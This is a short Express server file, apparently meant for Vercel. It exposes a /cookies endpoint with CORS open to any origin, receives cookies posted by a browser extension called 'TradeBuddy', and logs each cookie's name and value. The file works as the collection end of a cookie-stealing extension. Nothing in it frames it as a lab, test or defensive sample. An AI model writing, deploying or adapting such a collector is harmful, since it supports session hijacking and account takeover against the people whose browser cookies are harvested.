import express from 'express';
const app = express();

app.use(express.json());

// CORS — allow the extension to POST here
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.post('/cookies', (req, res) => {
  const { origin, cookies } = req.body;
  console.log('=== Received from TradeBuddy extension ===');
  console.log('Origin:', origin);
  console.log('Cookie count:', cookies.length);
  cookies.forEach(c => console.log(`  ${c.name} = ${c.value}`));
  res.json({ ok: true, received: cookies.length });
});

// Export the app for Vercel (required for auto-detection)
export default app;